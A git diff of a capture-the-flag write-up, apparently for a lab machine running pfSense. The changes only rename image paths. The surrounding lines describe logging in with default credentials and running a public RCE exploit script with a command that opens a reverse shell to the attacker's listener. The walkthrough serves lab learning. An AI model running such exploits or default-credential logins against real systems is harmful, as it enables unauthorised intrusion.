@@ -21,7 +21,7 @@ PORT    STATE SERVICE
 
 Visiting the IP address redirects us to port 443 where pfSense is running:
 
-![](<../../../.gitbook/assets/image%20(3534).png>)
+![](../../../.gitbook/assets/sense-3.png)
 
 We can run a `dirbuster` scan to see what else is on the port because we have no credentials right now. We can include all the common extensions using `-e php,html,txt` to see all possible files on the machine.
 
@@ -63,7 +63,7 @@ password: company defaults
 
 So the username is Rohit and the password is the default password. In this case, the default password for this software is `pfsense`. We can then login and see the version running:
 
-![](<../../../.gitbook/assets/image%20(187).png>)
+![](../../../.gitbook/assets/sense-2.png)
 
 This is an outdated version of pfSense running, and it is vulnerable to an RCE exploit.
 
@@ -83,6 +83,6 @@ We can download this exploit and use it to get a reverse shell.
 python3 43560.py --rhost 10.129.85.96 --lhost 10.10.14.13 --lport 4444 --username rohit --password pfsense
 ```
 
-![](<../../../.gitbook/assets/image%20(169).png>)
+![](../../../.gitbook/assets/sense-1.png)
 
 Rooted!
